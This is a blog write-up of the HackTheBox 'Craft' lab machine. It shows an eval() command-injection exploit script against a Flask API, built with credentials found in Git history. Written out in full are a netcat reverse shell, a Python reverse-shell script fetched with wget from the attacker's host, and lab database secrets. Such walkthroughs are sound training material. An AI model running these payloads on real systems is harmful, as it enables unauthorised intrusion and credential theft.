<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Craft - HackTheBox :: hg8&#39;s Notes ‚Äî My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Table of contents    User Flag  Recon Remote code execution on API Pivot from docker container to user   Root Flag  Recon Exploiting Vault for SSH root password       Craft was very interesting and well designed box. It was a not so straight forward to solve and mainly based on configuration mistakes rather than exploits. That makes it more interesting in my opinion since we get closer to real life scenarios."/>
<meta name="keywords" content="hackthebox, ctf, craft, gogs, api, flask, python, eval, git, vault"/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/craft/" />




<link rel="stylesheet" href="/assets/style.css">


<link rel="stylesheet" href="/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="/img/favicon.png">

<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">

<link rel="shortcut icon" href="/img/favicon.ico">



<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Craft - HackTheBox"/>
<meta name="twitter:description" content="Craft was very interesting and well designed box. It was a not so straight forward to solve and mainly based on configuration mistakes rather than exploits. That makes it more interesting in my opinion since we get closer to real life scenarios. I also learned a few tricks on this one.

**Tl;Dr:** The user flag was accessible after finding the main API credentials in the Git history of the project. With access to the code source and the API itself, we find a vulnerability allowing Remote Code Execution. This RCE leads to a shell inside of a Docker. From this shell we access the API config files containing database connection settings allowing us to extract users credentials stored there. The credentials let us access to `gilfoyle` repositories where one contains his SSH key backup. Using this SSH key we connect to his account and grab the user flag.  
The root flag was accessible after using Vault instance configured on the box to generate a One Time Password for the SSH `root` account. We connect through SSH using this password and get the flag.

Alright! Let&#39;s get into the details now!
"/>



<meta property="og:title" content="Craft - HackTheBox" />
<meta property="og:description" content="Craft was very interesting and well designed box. It was a not so straight forward to solve and mainly based on configuration mistakes rather than exploits. That makes it more interesting in my opinion since we get closer to real life scenarios. I also learned a few tricks on this one.

**Tl;Dr:** The user flag was accessible after finding the main API credentials in the Git history of the project. With access to the code source and the API itself, we find a vulnerability allowing Remote Code Execution. This RCE leads to a shell inside of a Docker. From this shell we access the API config files containing database connection settings allowing us to extract users credentials stored there. The credentials let us access to `gilfoyle` repositories where one contains his SSH key backup. Using this SSH key we connect to his account and grab the user flag.  
The root flag was accessible after using Vault instance configured on the box to generate a One Time Password for the SSH `root` account. We connect through SSH using this password and get the flag.

Alright! Let&#39;s get into the details now!
" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/craft/" />
<meta property="article:published_time" content="2020-01-04T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-01-04T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        
<nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/">Posts</a></li>
        
      
        
          <li><a href="/tags">Tags</a></li>
        
      
        
          <li><a href="/about">About</a></li>
        
      
      
    
    <li>
<a href="/search" title="Search">
<img src="/icon/search.svg" alt="search" height="20">
</a>
<li>
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/">Posts</a></li>
      
    
      
        <li><a href="/tags">Tags</a></li>
      
    
      
        <li><a href="/about">About</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title"><a href="/posts/craft/">Craft - HackTheBox</a></h1>
    <div class="post-meta">
      
        <span class="post-date">
          2020-01-04
        </span>

        
          
        
      

      <span class="post-author">‚Äî Written by hg8</span>
      
        <span class="post-read-time">‚Äî 14 min read</span>
      
    </div>

    
      <span class="post-tags">
        
          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
        
          #<a href="/tags/ctf/">ctf</a>&nbsp;
        
          #<a href="/tags/craft/">craft</a>&nbsp;
        
          #<a href="/tags/gogs/">gogs</a>&nbsp;
        
          #<a href="/tags/api/">api</a>&nbsp;
        
          #<a href="/tags/flask/">flask</a>&nbsp;
        
          #<a href="/tags/python/">python</a>&nbsp;
        
          #<a href="/tags/eval/">eval</a>&nbsp;
        
          #<a href="/tags/git/">git</a>&nbsp;
        
          #<a href="/tags/vault/">vault</a>&nbsp;
        
      </span>
    

    
      
        <img src="/img/craft-hackthebox.png" class="post-cover" />
      
    

    <div class="post-content">
      <hr>
<details open class="entry-toc">
  <summary>
    <span>
        <b>Table of contents</b>
    </span>
  </summary>
  <nav id="TableOfContents">
  <ul>
    <li><a href="#user-flag">User Flag</a>
      <ul>
        <li><a href="#recon">Recon</a></li>
        <li><a href="#remote-code-execution-on-api">Remote code execution on API</a></li>
        <li><a href="#pivot-from-docker-container-to-user">Pivot from docker container to user</a></li>
      </ul>
    </li>
    <li><a href="#root-flag">Root Flag</a>
      <ul>
        <li><a href="#recon-1">Recon</a></li>
        <li><a href="#exploiting-vault-for-ssh-root-password">Exploiting Vault for SSH root password</a></li>
      </ul>
    </li>
  </ul>
</nav>
</details>

<hr>
<p>Craft was very interesting and well designed box. It was a not so straight forward to solve and mainly based on configuration mistakes rather than exploits. That makes it more interesting in my opinion since we get closer to real life scenarios. I also learned a few tricks on this one.</p>
<p><strong>Tl;Dr:</strong> The user flag was accessible after finding the main API credentials in the Git history of the project. With access to the code source and the API itself, we find a vulnerability allowing Remote Code Execution. This RCE leads to a shell inside of a Docker. From this shell we access the API config files containing database connection settings allowing us to extract users credentials stored there. The credentials let us access to <code>gilfoyle</code> repositories where one contains his SSH key backup. Using this SSH key we connect to his account and grab the user flag.<br>
The root flag was accessible after using Vault instance configured on the box to generate a One Time Password for the SSH <code>root</code> account. We connect through SSH using this password and get the flag.</p>
<p>Alright! Let&rsquo;s get into the details now!</p>
<hr>
<p>First thing first, let&rsquo;s add the box IP to the host file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.110 craft.htb&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>and let&rsquo;s start!</p>
<h2 id="user-flag">User Flag</h2>
<h3 id="recon">Recon</h3>
<p>Let‚Äôs start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nmap -sV -sT -sC craft.htb
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-10-20 01:26 CEST
Nmap scan report <span style="color:#66d9ef">for</span> craft.htb <span style="color:#f92672">(</span>10.10.10.110<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
443/tcp open  ssl/http nginx 1.15.8
|_http-server-header: nginx/1.15.8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 17.15 seconds
</code></pre></div><p>We have a classical web app running on port 443 and the ssh port 22 open.</p>
<p>Opening <code>http://craft.htb</code> display the following website :</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67158804-0db48600-f33d-11e9-98f1-b10407a44179.png" alt="Craft Website"></p>
<p>The website is super simple but give us two valuable information:</p>
<ul>
<li>A <code>gogs</code> instance is running (<code>gogs</code> is a self-hosted Git service written in Go) at <code>https://gogs.craft.htb/</code></li>
<li>An API is running and its documentation available at <code>https://api.craft.htb/api/</code></li>
</ul>
<p>We need to add those two in our <code>/etc/hosts/</code> file to be able to access it :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.110 gogs.craft.htb&#34;</span> &gt;&gt; /etc/hosts
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.110 api.craft.htb&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Following this, <code>https://gogs.craft.htb</code> displays:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67158918-b8797400-f33e-11e9-9223-2ac64d958595.png" alt="Gogs instance Craft website"></p>
<p>and <code>https://api.craft.htb</code> displays:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67158927-c8915380-f33e-11e9-8c59-cc2973c76cfd.png" alt="Craft API website"></p>
<p>We have the source code and the documentation of the API. That will surely be our entry point.</p>
<p>Out of curiosity I checked for exploit on <code>Gogs</code> and found CVE-2018-18925 and CVE-2018-20303:</p>
<blockquote>
<p>Gogs 0.11.66 allows remote code execution because it does not properly validate session IDs, as demonstrated by a &ldquo;..&rdquo; session-file forgery in the file session provider in file.go.<br>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-18925">https://nvd.nist.gov/vuln/detail/CVE-2018-18925</a></p>
</blockquote>
<blockquote>
<p>In pkg/tool/path.go in Gogs before 0.11.82.1218, a directory traversal in the file-upload functionality can allow an attacker to create a file under data/sessions on the server.<br>
<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-20303">https://nvd.nist.gov/vuln/detail/CVE-2018-20303</a></p>
</blockquote>
<p>An exploit is also available (<a href="https://github.com/TheZ3ro/gogsownz">GogsOwnz</a>) and allows to gain administrator rights and RCE on a Gogs/Gitea server.</p>
<p>Unfortunately the footer of <code>https://gogs.craft.htb</code> shows that the version used is not a vulnerable one :</p>
<blockquote>
<p>¬© 2018 Gogs Version: 0.11.86.0130</p>
</blockquote>
<p>This confirms that our entry point will probably be the api. Let&rsquo;s investigate.</p>
<p>We have access to the source code it will greatly help our investigation. The API is written in Python using the Flask framework.</p>
<p>Let&rsquo;s clone it to check the code more easily :</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ GIT_SSL_NO_VERIFY<span style="color:#f92672">=</span>true git clone https://gogs.craft.htb/Craft/craft-api.git
</code></pre></div><h3 id="remote-code-execution-on-api">Remote code execution on API</h3>
<p>The first thing I do when doing static code analysis is checking if dangerous functions are used and can be exploited for command injection. It&rsquo;s the easiest way to land a shell on a box.
If this search don&rsquo;t give any results I will move on to SQL injection and so on.</p>
<p>The most common way command injection vulnerability get introduced in Python is by the use of <code>eval()</code> function which is used to run the Python code (passed as argument) within the program.</p>
<p>A quick <code>grep</code> will tell us if such function is used within the API:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ grep -ri <span style="color:#e6db74">&#34;eval&#34;</span> craft-api
craft-api/craft_api/api/brew/endpoints/brew.py:        <span style="color:#66d9ef">if</span> eval<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;%s &gt; 1&#39;</span> % request.json<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;abv&#39;</span><span style="color:#f92672">])</span>:
</code></pre></div><p>We are lucky, and just by the look of the line it seems like no sanitization is done and the <code>abv</code> request parameter is directly run through <code>eval()</code>.</p>
<p>Reading through the code of <code>brew.py</code> confirm the suspicion:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >@auth.auth_required
@api.expect(beer_entry)
def post(self):
&#34;&#34;&#34;
Creates a new brew entry.
&#34;&#34;&#34;

# make sure the ABV value is sane.
if eval(&#39;%s &gt; 1&#39; % request.json[&#39;abv&#39;]):
    return &#34;ABV must be a decimal value less than 1.0&#34;, 400
else:
    create_brew(request.json)
    return None, 201
</code></pre>
  


<p>Any Python code sent in the request <code>abv</code> parameter will get interpreted.</p>
<p>Unfortunately <code>@auth.auth_required</code> inform us that we will first need a way to authenticate ourselves before being able to use this vulnerable endpoint.</p>
<p>After reading the documentation and the source code, it doesn&rsquo;t seem there is any way to create a new account or use an already made token to authenticate to the API. We need to find another way to authenticate.</p>
<p>Since we have access to the git repository, we can try to exploit common flaw found in git/svn repositories. The most common issue is developers accidentally push API keys, token or password to the repository.</p>
<p>There is a few good tools like <a href="https://github.com/dxa4481/truffleHog">truffleHog</a> or <a href="https://github.com/awslabs/git-secrets">git-secrets</a> that allows to automatically retrieve secrets and credentials accidentally committed.</p>
<p>Since there is only 6 commits in history we can manually review them to make sure we don&rsquo;t forget anything.</p>
<p>At commit <code>a2d28ed155</code> we find an interesting cleanup:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/67160472-668e1980-f351-11e9-8cb2-f2f49bae0833.png" alt="Commit cleanup"></p>
<p>Let&rsquo;s try to use those credentials to authenticate to the API:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ curl <span style="color:#e6db74">&#34;https://api.craft.htb/api/auth/login&#34;</span> -k --user dinesh:4aUh0A8PbVJxgd
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&#34;</span><span style="color:#f92672">}</span>
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ curl -H <span style="color:#e6db74">&#34;X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&#34;</span>  <span style="color:#e6db74">&#34;https://api.craft.htb/api/auth/check&#34;</span> -k
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
</code></pre></div><p>We are authenticated! Note here that this API doesn&rsquo;t use the usual <code>Authorization: Bearer &lt;token&gt;</code> header but a custom header in the format <code>X-Craft-Api-Token: &lt;token&gt;</code>. It can be easy to overlook this one, that&rsquo;s why taking time to read the code and understanding the inner workings of the app is important.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># craft_api/api/auth/endpoints/auth.py</span>
token <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;X-Craft-Api-Token&#39;</span>]
</code></pre></div><p>We have now all the needed information to perform our command injection :)</p>
<p>Since we need to authenticate and perform multiple queries on the <code>/brew</code> endpoint it&rsquo;s better to write a script instead of having to do a thousand of curl request.</p>
<p>No need to start from scratch since <code>craft-api/tests/test.py</code> already provide a solid base. I tweaked it a little to end up with this script:</p>


  
    <pre class="language-python line-numbers"
      ><code class="language-python"
      >#!/usr/bin/env python
import requests
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

response = requests.get(&#39;https://api.craft.htb/api/auth/login&#39;,  auth=(&#39;dinesh&#39;, &#39;4aUh0A8PbVJxgd&#39;), verify=False)
json_response = json.loads(response.text)
token = json_response[&#39;token&#39;]

headers = {&#39;X-Craft-API-Token&#39;: token, &#39;Content-Type&#39;: &#39;application/json&#39;}

response = requests.get(&#39;https://api.craft.htb/api/auth/check&#39;, headers=headers, verify=False)
print(response.text)  # make sure token is valid

while True:
    cmd = input(&#39;&gt; &#39;)

    brew_dict = {}
    brew_dict[&#39;abv&#39;] = &#39;__import__(&#34;os&#34;).popen(&#34;{}&#34;).read()&#39;.format(cmd)
    brew_dict[&#39;name&#39;] = &#39;bullshit&#39;
    brew_dict[&#39;brewer&#39;] = &#39;bullshit&#39;
    brew_dict[&#39;style&#39;] = &#39;bullshit&#39;

    json_data = json.dumps(brew_dict)
    response = requests.post(&#39;https://api.craft.htb/api/brew/&#39;, headers=headers, data=json_data, verify=False)
</code></pre>
  


<p>Since <code>eval()</code> will run any python code we will use this lambda function <code>__import__(&quot;os&quot;).popen(&quot;CMD&quot;).read()</code> to run an OS command from the python code.</p>
<p>I added an <code>input('&gt; ')</code> so we simply have to type our command to run it on the API. Shell style.</p>
<p>Unfortunately we don&rsquo;t have any output available, so how are we going to know that our command executed successfully ?</p>
<p>With time-based injection ;)</p>
<p>We are going to inject a <code>sleep 3</code> command at each run:</p>
<ul>
<li>If the API hang for 3 seconds, it means our command got executed successfully</li>
<li>If the API respond immediately, the injection failed.</li>
</ul>
<p>Using the <code>requests</code> library <code>elapsed.total_seconds()</code> function, we can display the time elapsed for the request to success.</p>
<p>I add it to the script so we can easily see if the <code>sleep 5</code> injection worked fine.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#f92672">...</span>]
<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Execution time: {}&#34;</span><span style="color:#f92672">.</span>format(response<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()))
</code></pre></div><p>Let&rsquo;s it give a try:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python test.py
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>

&gt; test
Execution time: 0.147798
&gt; sleep <span style="color:#ae81ff">3</span>
Execution time: 3.158874
&gt;
</code></pre></div><p>Looks like it works fine ! Let&rsquo;s tweak our script a bit to be more comfortable to use:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff"><span style="color:#f92672">- brew_dict[&#39;abv&#39;] = &#39;__import__(&#34;os&#34;).popen(&#34;{}&#34;).read()&#39;.format(cmd)
</span><span style="color:#f92672"></span><span style="color:#a6e22e">+ brew_dict[&#39;abv&#39;] = &#39;__import__(&#34;os&#34;).popen(&#34;{} &amp;&amp; sleep 3&#34;).read()&#39;.format(cmd)
</span></code></pre></div><p>The usage of <code>&amp;&amp; sleep 3</code> means that the sleep command will only get executed if the first command succeeded. This technique will allow us to blindly learn about the box environment.</p>
<p>Here is an example to illustrate:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python test.py
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>

&gt; curl --help
Execution time: 0.162407
&gt; wget --help
Execution time: 3.160078
</code></pre></div><p>Since <code>wget --help</code> command took 3 seconds to execute this means that the command ran fine. While <code>curl --help</code> failed, the <code>sleep 3</code> didn&rsquo;t start meaning <code>curl</code> is not probably not installed.</p>
<p>This little trick will allow us to have a valuable feedback to know if our command succeed or fail.</p>
<p>Let&rsquo;s try to open our classic reverse shell. Start with our listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
</code></pre></div><p>And launch our test script on the API:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python test.py
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>

&gt; nc -e /bin/sh 10.10.10.85 <span style="color:#ae81ff">8585</span>
Execution time: 0.218422
&gt; nc --help
Execution time: 3.412322
&gt;
</code></pre></div><p>Oddly enough this is not working, whereas <code>nc</code> seems to be installed. That&rsquo;s strange but let&rsquo;s move on to a different type of reverse shell. Since we know for sure that Python is installed let&rsquo;s use a Python reverse shell.</p>
<p>To make things easier let&rsquo;s launch a small http server to host our python reverse shell file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ cat hg8.py
import socket,subprocess,os;
s<span style="color:#f92672">=</span>socket.socket<span style="color:#f92672">(</span>socket.AF_INET,socket.SOCK_STREAM<span style="color:#f92672">)</span>;
s.connect<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;10.10.10.85&#34;</span>,8585<span style="color:#f92672">))</span>;
os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,0<span style="color:#f92672">)</span>;
os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,1<span style="color:#f92672">)</span>;
os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,2<span style="color:#f92672">)</span>;
p<span style="color:#f92672">=</span>subprocess.call<span style="color:#f92672">([</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span><span style="color:#f92672">])</span>;
<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python -m http.server
Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
</code></pre></div><p>And back to our original terminal let&rsquo;s launch our injection:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python test.py
<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>

&gt; wget 10.10.10.85:8000/hg8.py -O /tmp/hg8.py
Execution time: 1.15602
&gt; python /tmp/hg8.py
</code></pre></div><p>And surely enough a connection open on our <code>netcat</code> listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
Listening on any address <span style="color:#ae81ff">8585</span>
Connection from 10.10.10.110:57154
/opt/app <span style="color:#75715e"># id</span>
uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1<span style="color:#f92672">(</span>bin<span style="color:#f92672">)</span>,2<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>,3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,6<span style="color:#f92672">(</span>disk<span style="color:#f92672">)</span>,10<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>,11<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,20<span style="color:#f92672">(</span>dialout<span style="color:#f92672">)</span>,26<span style="color:#f92672">(</span>tape<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>
</code></pre></div><p><em>Note: Now that we are on the box we can investigate on why our original <code>netcat</code> command wasn&rsquo;t working. Turn out the <code>netcat</code> version shipped in this box in a Busybox version. The manual state:</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/app <span style="color:#75715e"># nc</span>
BusyBox v1.29.3 <span style="color:#f92672">(</span>2019-01-24 07:45:07 UTC<span style="color:#f92672">)</span> multi-call binary.

Usage: nc <span style="color:#f92672">[</span>OPTIONS<span style="color:#f92672">]</span> HOST PORT  - connect
nc <span style="color:#f92672">[</span>OPTIONS<span style="color:#f92672">]</span> -l -p PORT <span style="color:#f92672">[</span>HOST<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span>  - listen

    -e PROG    Run PROG after connect <span style="color:#f92672">(</span>must be last<span style="color:#f92672">)</span>
   <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
</code></pre></div><p><em>In this version <code>-e</code> option <strong>must be last</strong>. So if we ran <code>nc 10.10.10.85 8585 -e /bin/sh</code> instead of <code>nc -e /bin/sh 10.10.10.85 8585</code> the command would have succeeded perfectly. I tried and it worked. Odd but good to keep in mind for the future.</em></p>
<h3 id="pivot-from-docker-container-to-user">Pivot from docker container to user</h3>
<p>Now back to our topic. We got our shell on the API. Unfortunately as you noticed with the <code>id</code> command, it seems like we are in a docker container. We probably won&rsquo;t go far from here.</p>
<p>Our best bet might be to retrieve the API secrets to see if we can progress from here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/app/craft_api <span style="color:#75715e"># cat settings.py</span>
<span style="color:#75715e"># Flask settings</span>
FLASK_SERVER_NAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;api.craft.htb&#39;</span>
FLASK_DEBUG <span style="color:#f92672">=</span> False  <span style="color:#75715e"># Do not use debug mode in production</span>

<span style="color:#75715e"># Flask-Restplus settings</span>
RESTPLUS_SWAGGER_UI_DOC_EXPANSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;list&#39;</span>
RESTPLUS_VALIDATE <span style="color:#f92672">=</span> True
RESTPLUS_MASK_SWAGGER <span style="color:#f92672">=</span> False
RESTPLUS_ERROR_404_HELP <span style="color:#f92672">=</span> False
CRAFT_API_SECRET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hz66OCkDtv8G6D&#39;</span>

<span style="color:#75715e"># database</span>
MYSQL_DATABASE_USER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
MYSQL_DATABASE_PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qLGockJ6G2J75O&#39;</span>
MYSQL_DATABASE_DB <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
MYSQL_DATABASE_HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;db&#39;</span>
SQLALCHEMY_TRACK_MODIFICATIONS <span style="color:#f92672">=</span> False
</code></pre></div><p>We got the database credentials. Let&rsquo;s try to dump it for juicy informations:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/app <span style="color:#75715e"># mysql</span>
